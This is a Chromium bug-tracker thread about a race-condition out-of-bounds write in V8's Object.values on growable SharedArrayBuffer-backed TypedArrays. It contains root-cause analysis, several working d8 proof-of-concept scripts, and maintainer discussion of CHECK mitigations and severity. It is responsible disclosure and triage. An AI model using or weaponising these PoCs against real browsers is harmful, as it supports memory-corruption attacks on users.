## Description

# Steps to reproduce the problem

run with:
Download worker.js and poc.js and put them in the same directory.
d8 poc.js

# Problem Description

## Root Cause

The root cause is **inconsistent length snapshots** within one logical operation, plus missing write-side capacity bounds.

- Allocation uses old length (snapshot A)
- Writing re-reads a new length (snapshot B, possibly larger)
- When `snapshot B > snapshot A`, `values_or_entries->set(count++, ...)` writes out of bounds

This is a classic shared-memory TOCTOU problem under GSAB + length-tracking TypedArray concurrent growth.

## Trigger Path and Call Chain

Key call chain:

1. `Object.values(ta)` / `Object.entries(ta)` enters the fast path.
2. `FastGetOwnValuesOrEntries` allocates the result array using one length snapshot:
   - `src/objects/js-objects.cc:2240`
   - `src/objects/js-objects.cc:2249`
3. Then it enters TypedArray element collection:
   - `src/objects/js-objects.cc:2254`
   - `src/objects/elements.cc:3719`
4. `TypedElementsAccessor::CollectValuesOrEntriesImpl` reads the current length again and writes in a loop:
   - Length read: `src/objects/elements.cc:3726`
   - Write site: `src/objects/elements.cc:3733`

In the PoC, a worker concurrently executes `sab.grow(...)`, making step-2 allocation length smaller than step-4 write length, which causes OOB writes.

### ma...@chromium.org (2026-03-02)

I can repro this and the description + analysis is legit.

This is an OOB write into a FixedArray where we're collecting the elements.

### ma...@chromium.org (2026-03-02)

The fix is underway.

In release mode, the repro is hitting this CHECK:

```

```

This is in FastGetOwnValuesOrEntries, right at the end. At this point, we've already written beyond the FixedArray, but it looks like we crash right after, so, we probably can't do much harm after?

### qy...@gmail.com (2026-03-02)

Sorry, I may have uploaded an incorrect pocjs. Please check <https://issues.chromium.org/issues/487746373> first; these two issues are very similar, and I just verified that 487746373 can be correctly reproduced.

I will provide you with a new pocjs later to verify the issue.

### ma...@chromium.org (2026-03-02)

This one also reproes in debug mode as described in the OP, and it hits the code path in the analysis.

In release mode, we don't get the DCHECK crash, obviously, but we seem to hit a CHECK and crash controllably very soon after.

### qy...@gmail.com (2026-03-02)

Thank you for your careful review. I understand the problem now. Please run it a few more times. Because this is a race condition, it won't always be successfully triggered.

### ma...@chromium.org (2026-03-02)

I upped the iteration count to make sure it's triggered, so that part is fine. The repro is very reliable that way.

What I'm saying is that in release mode, soon after the OOB write is triggered, we hit another safeguard.

### qy...@gmail.com (2026-03-02)

I understand the reproduction process you described, and I suggest you run it manually, one time at a time. Because when you wrap the PoC in one js and run it repeatedly, there's a high chance it will hit the check at some point.

### qy...@gmail.com (2026-03-02)

Especially when you're reproducing the issue at <https://issues.chromium.org/issues/487746373>, you might hit various checks, such as "Check failed: isolate\_ == isolate" and "Check failed: new\_capacity <= old\_capacity." You might also hit various signal 11 SEGV errors.

### ma...@chromium.org (2026-03-02)

Copy-pasting the d8 based repro here, in case we want to add a test for this later. Currently it's too slow.

```

const workerScript = function() {
  onmessage = function(msg) {
    const sab = (msg && typeof msg === "object" && "data" in msg) ? msg.data : msg;
    const max = sab.maxByteLength;
    for (let n = sab.byteLength + 1; n <= max; ++n) {
      sab.grow(n);
    }
  };
}

const w = new Worker(workerScript, {type: 'function'});

const sab = new SharedArrayBuffer(1, { maxByteLength: 0x4000 });
const ta = new Uint8Array(sab);

w.postMessage(sab);

// Races with worker-side grow() calls.
for (let i = 0; i < 0x4000; ++i) {
  if (i % 100 == 0) print(i);
  Object.values(ta);
}

w.terminate();

```

I currently cannot repro in release mode without upping the iteration count, not even if I run multiple times. And when I get a crash, it's always the `Check failed: new_capacity <= old_capacity.` one, which means, we're crashing in a controlled way, which is good (for us, from the exploitability point of view).

### qy...@gmail.com (2026-03-02)

Sorry, I just saw your reply and apologize for keeping you waiting.
I've been debugging locally, trying to find the problem. However, I can still reproduce the issue correctly with asan version (it rarely triggers the check). Do you think this could be due to the d8 version or system environment (since it's a race condition, I think this is possible)?

My reproduction environment is:

Ubuntu 24.04 x64

d8 14.7.0 (debug and asan versions)

d8 14.5.0 (asan version)

### qy...@gmail.com (2026-03-02)

I've found the reason you couldn't reproduce it.

In your provided PoC, the code `for (let i = 0; i < 0x4000; ++i) {` can be modified to `for (let i = 0; i < 2000; ++i) {` to reproduce the problem correctly,and the check won't be triggered.

```
const workerScript = function() {
  onmessage = function(msg) {
    const sab = (msg && typeof msg === "object" && "data" in msg) ? msg.data : msg;
    const max = sab.maxByteLength;
    for (let n = sab.byteLength + 1; n <= max; ++n) {
      sab.grow(n);
    }
  };
}

const w = new Worker(workerScript, {type: 'function'});

const sab = new SharedArrayBuffer(1, { maxByteLength: 0x4000 });
const ta = new Uint8Array(sab);

w.postMessage(sab);

// Races with worker-side grow() calls.
for (let i = 0; i < 2000; ++i) {
  //if (i % 100 == 0) print(i);
  Object.values(ta);
}

w.terminate();

### ml...@google.com (2026-03-03)

Trying to consolidate the discussion in here.

Reporter: From the discussion in here (and offline talking to folks) it looks like this should always run into a CHECK on release builds. Please correct me if you observed something differently.

Downgrading severity as there's mitigating factors but there's still a small window of opportunity here.

### qy...@gmail.com (2026-03-03)

Hello, could you please review the CF results in [comment #16](https://issues.chromium.org/issues/487768771#comment16)? It shows that no check were triggered.
The reason we discussed the check issue earlier was that the initial js had too many iterations.

The poc.js in [comment #15](https://issues.chromium.org/issues/487768771#comment15) does not trigger check, and it is detected by dcheck

I would like to request that the severity be changed to S1.

Thank you for taking the time to review this.

### ml...@chromium.org (2026-03-03)

[Comment #16](https://issues.chromium.org/issues/487768771#comment16) (CF) doesn't show any crasher (CHECK) or segfault. It's not a valid reproduction.

I can try with [Comment #15](https://issues.chromium.org/issues/487768771#comment15) again.

From the discussion it looks like it should always run into the CHECK(). On ASAN builds the ASAN infra will catch it first. On debug builds we run in the DCHECK.

### qy...@gmail.com (2026-03-03)

I believe the CF results already demonstrate that this poc.js does not trigger any check on an ASan build without dcheck enabled. This is exactly what I have been trying to prove all along: this poc.js does not hit any check.

(This is not a case of CF failing to validate the issue; rather, it clearly validates the point where our interpretations diverge.)

I would like to request that the severity be changed to S1.

### ml...@google.com (2026-03-03)

> I believe the CF results already demonstrate that this poc.js does not trigger any check on an ASan build without dcheck enabled. This is exactly what I have been trying to prove all along: this poc.js does not hit any check.

The CF repro doesn't show anything. We have no way of telling apart CF from doing a regular access versus an illegal access if there's no crash. We need to reproduce a segfault on a release build, since the general observation through code review was that this is covered in a `CHECK()` ([comment #6](https://issues.chromium.org/issues/487768771#comment6)).

- Can you reproduce this locally somehow with a segfault on a modified repro? I am happy to also try locally.
- Why would the CHECK() not be hit?

### qy...@gmail.com (2026-03-04)

Sorry for the wait. Here is a poc.js that can cause an ASan crash, which confirms that an OOB write does indeed occur.

How it works:

- N=65530 makes the FixedArray exactly 256KB in LOS (zero slack at the 256KB page boundary)
- Worker uses Atomics-based synchronization: it waits for a "go" signal, then starts incremental sab.grow()
- Main thread sends "go" and immediately calls Object.values(ta)
- The worker wakes up during the NewFixedArray(65530) allocation, so:
  - First read: 65530 (worker hasn't grown yet)
  - Second read: >65530 (worker grew during allocation)
- OOB write at index 65530 crosses into the next 256KB block (PROT\_NONE) → SIGSEGV

run with command:`ASAN_OPTIONS=handle_segv=1:allow_user_segv_handler=0 timeout 120 out/x64.asan/d8 --no-wasm-trap-handler poc.js`

```
const signal = new SharedArrayBuffer(12);
const sig = new Int32Array(signal);

const workerScript = function() {
  onmessage = function(msg) {
    const data = (msg && typeof msg === "object" && "data" in msg) ? msg.data : msg;
    const sab = data.sab;
    const sig = new Int32Array(data.signal);

    Atomics.store(sig, 0, 1);
    Atomics.notify(sig, 0);

    Atomics.wait(sig, 1, 0);

    const max = sab.maxByteLength;
    for (let n = sab.byteLength + 1; n <= max; ++n) {
      try { sab.grow(n); } catch(e) { break; }
    }

    Atomics.store(sig, 2, 1);
    Atomics.notify(sig, 2);
  };
}

const N = 65530;      // FixedArray fills 256KB LOS page exactly
const delta = 500; 

const worker = new Worker(workerScript, {type: 'function'});


let w = 0;
for (let j = 0; j < 100000; j++) w += j;

for (let attempt = 0; attempt < 3000; ++attempt) {
  const sab = new SharedArrayBuffer(N, { maxByteLength: N + delta });
  const ta = new Uint8Array(sab);

  Atomics.store(sig, 0, 0);
  Atomics.store(sig, 1, 0);
  Atomics.store(sig, 2, 0);

  worker.postMessage({sab: sab, signal: signal});

  while (Atomics.load(sig, 0) === 0) {}

  Atomics.store(sig, 1, 1);
  Atomics.notify(sig, 1);
  try { Object.values(ta); } catch(e) {}

  while (Atomics.load(sig, 2) === 0) {}
}

worker.terminate();

```

You can also run it directly with `out/x64.asan/d8 poc.js`. When the race timing is right, it will trigger an oob write and crash. On my local, it reproduces with roughly a 50% probability.

### ml...@google.com (2026-03-04)

Thank you for your time and effort here!

We already confirmed that this is indeed an OOB write. ASAN will catch that first and abort execution.

The assumption was that there's mitigating factors with always crashing in a CHECK right after the OOB write. ([comment #6](https://issues.chromium.org/issues/487768771#comment6))

I think the last snipped on your end shows that this is not always the case. Adjusting labels properly.

marja: There seems to be paths that bypass the CHECK(). Is this indeed the same bug?

### qy...@gmail.com (2026-03-04)

Yes, it is exactly the same vulnerability and the same root cause.

### Comparison

| Item | before | now |
| --- | --- | --- |
| Root cause | TOCTOU race: `FastGetOwnValuesOrEntries` reads the GSAB TypedArray length twice | Same |
| 1st read | `js-objects.cc:2244` `GetCapacity` , allocates a `FixedArray` | Same |
| 2nd read | `elements.cc:3725` `GetCapacityImpl` , loop writes into the array | Same |
| OOB write | `elements.cc:3732` `values_or_entries->set(count++, ...)` | Same |
| Trigger | Worker concurrently calls `sab.grow()` | Same |

### The only difference is parameter tuning

- Original PoC: `N = 1`, `maxByteLength = 0x4000` , only triggers `DCHECK` in debug builds.
- New PoC: `N = 65530` , the `FixedArray` becomes exactly **256 KB** (a LOS page with no slack). Any OOB write crosses into the `PROT_NONE` guard page, leading to **SIGSEGV** and an **ASan** report.

### ASan stack trace alignment

The ASan call stack also precisely matches the same call chain :

- `#0 CollectValuesOrEntries` (elements.cc ,second read + OOB write)
- `#1 FastGetOwnValuesOrEntries` (js-objects.cc:2259 ,first read + allocation)

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [144, 145, 146].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ma...@chromium.org (2026-03-05)

Re: whether the CHECK always triggers shortly after the OOB write.

We're here:
<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/js-objects.cc;l=2259?q=FastGetOwnValuesOrEntries&ss=chromium>

```
V8_WARN_UNUSED_RESULT Maybe<bool> FastGetOwnValuesOrEntries(
    Isolate* isolate, DirectHandle<JSReceiver> receiver, bool get_entries,
    Handle<FixedArray>* result) {
  ....

  if (object->elements() != ReadOnlyRoots(isolate).empty_fixed_array()) {
    MAYBE_RETURN(object->GetElementsAccessor()->CollectValuesOrEntries(
                     isolate, object, values_or_entries,
                     static_cast<uint32_t>(number_of_own_elements), get_entries,
                     &count, ENUMERABLE_STRINGS),
                 Nothing<bool>());
  }

```

The OOB write happens inside the CollectValueOrEntries func. The MAYBE\_RETURN only returns if the thing is empty, which it isn't here.

Then we write some more (now potentially OOB) into values\_and\_entries. In the repro, there aren't any own descriptors, but in a variant repro, there could be:

```
  for (InternalIndex index : InternalIndex::Range(number_of_own_descriptors)) {
    ...

    values_or_entries->set(count, *prop_value);
    count++;
  }

```

And then we unconditionally do the trimming:

```
  DCHECK_LE(count, values_or_entries->ulength().value());
  *result = FixedArray::RightTrimOrEmpty(isolate, values_or_entries, count);
  return Just(true);

```

FixedArray::RightTrimOrEmpty calls FixedArray::RightTrim:

<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/fixed-array.cc;l=61;drc=fb2c45257d037e6c5b861b4cda82c3c7b96ac306>

and that calls TaggedArrayBase::RightTrim:

<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/fixed-array.cc;l=48?q=fixedarray:.righttrim&ss=chromium>

```
template <class D, class S, class P>
void TaggedArrayBase<D, S, P>::RightTrim(Isolate* isolate,
                                         uint32_t new_capacity) {
  const uint32_t old_capacity = this->capacity().value();
  CHECK_GT(new_capacity, 0);  // Due to possible canonicalization.
  CHECK_LE(new_capacity, old_capacity);
  if (new_capacity == old_capacity) return;
  isolate->heap()->RightTrimArray(Cast<D>(this), new_capacity, old_capacity);
}

```

which has the CHECK.

So based on this, I'd infer that the CHECK unconditionally happens very shortly after the OOB write.

The segfault-but-no-CHECK-failure repro seems to disagree. I'm not sure if the segfault there could be coming from the OOB write already? It's hard to reason about it, since I cannot repro that case locally, and also Clusterfuzz will just look for "any crash", i.e., CHECK failure, segfault, or whatever, and doesn't (to my knowledge) give us more granular data than that. E.g., we cannot tell it to only look for the segfault-but-no-CHECK-failure.

### ma...@chromium.org (2026-03-05)

1. Which CLs should be backmerged? (Please include Gerrit links.)

<https://chromium-review.git.corp.google.com/c/v8/v8/+/7623620>

2. Has this fix been verified on Canary to not pose any stability regressions?

It's been released on Canary and I haven't heard back re: any bugs. The CL *does* add some hardening CHECKs which might theoretically result in more crashes, if we have other bugs in this area. But those hardening CHECKs are also good for security.

3. Does this fix pose any potential non-verifiable stability risks?

I don't even know how to answer that

4. Does this fix pose any known compatibility risks?

No

5. Does it require manual verification by the test team?

No

### qy...@gmail.com (2026-03-05)

Thanks for your reply, ma. I carefully reviewed the code snippet you pointed out, and you are right.

The poc.js I provided in [comment #24](https://issues.chromium.org/issues/487768771#comment24) actually writes into the `PROT_NONE` guard page before reaching the `return`. That naturally causes an early crash, but it does not demonstrate that the issue can be exploited in a way that avoids being caught by `check`.

This vulnerability can be used to modify fields such as `map`, but it cannot be exploited on its own. After the OOB write, it will still be caught by `check`.

I’m really sorry for taking up both of your time. Please change the severity back to S2. (My mind has been quite messy recently, and I mistakenly thought that fields following the OOB write might be able to influence control flow. In reality, using this vulnerability alone will inevitably hit `check`; it needs to be combined with other vulnerabilities.)

### ma...@chromium.org (2026-03-05)

No worries, this is very subtle and non-trivial stuff. Thanks for filing these bug reports (this and the other one), they were solid!

### dr...@chromium.org (2026-03-07)

Given the severity, I don't think we need to merge this. Removing merge labels.

### ch...@google.com (2026-06-10)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.
